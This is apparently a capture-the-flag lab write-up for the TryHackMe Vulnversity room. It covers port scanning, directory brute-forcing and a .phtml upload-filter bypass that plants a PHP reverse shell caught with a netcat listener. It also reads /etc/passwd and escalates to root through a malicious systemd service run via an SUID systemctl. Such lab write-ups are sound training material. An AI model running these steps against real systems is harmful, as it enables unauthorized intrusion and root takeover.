# Vulnversity – TryHackMe Writeup

## Objective
Gain initial access to the target machine and escalate privileges to root.

---

## Reconnaissance

### Check if host is alive
```bash
ping -c 5 <target-ip>
```

### Full port scan
```bash
nmap -sV -p- <target-ip>
```

Discovered a web server running on a non-standard port.

---

## Directory Enumeration

```bash
gobuster dir -u http://<target-ip>:<port> -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

### Found
```
/internal
```

The directory contained a file upload form.

---

## Initial Access

### Upload Filter Bypass

Used Burp Suite to test allowed extensions.

Result:
```
.phtml allowed
```

Created a PHP reverse shell and saved it as:

```
php-reverse-shell.phtml
```

Edited attacker IP inside the file and uploaded it through the form.

---

### Start Listener

```bash
nc -lvnp 1234
```

---

### Trigger Reverse Shell

```
http://<target-ip>:<port>/internal/uploads/php-reverse-shell.phtml
```

Reverse shell successfully obtained.

---

## Post Exploitation

```bash
whoami
cat /etc/passwd
```

### User Flag
```bash
cd /home/bill
cat user.txt
```

---

## TTY Upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo
fg
export TERM=xterm
```

---

## Privilege Escalation

### Find SUID binaries
```bash
find / -type f -perm -4000 2>/dev/null
```

Found:
```
/bin/systemctl
```

---

### Abuse systemctl

Created a malicious service:

```bash
vim /tmp/root.service
```

Contents:

```ini
[Service]
Type=oneshot
ExecStart=/bin/bash -c "chmod +s /bin/bash"
```

Link and start:

```bash
/bin/systemctl link /tmp/root.service
/bin/systemctl start root.service
```

---

### Get Root Shell
```bash
/bin/bash -p
whoami
```

Output:
```
root
```

---

## Root Flag
```bash
cat /root/root.txt
```

---

## Attack Flow

- Nmap scanning  
- Directory brute forcing  
- File upload bypass (.phtml)  
- Reverse shell  
- TTY upgrade  
- SUID enumeration  
- systemctl privilege escalation  
- Root access gained  

---

## Tools Used

- Nmap  
- Gobuster  
- Burp Suite  
- Netcat  
- Linux enumeration  

---

✅ Room completed successfully
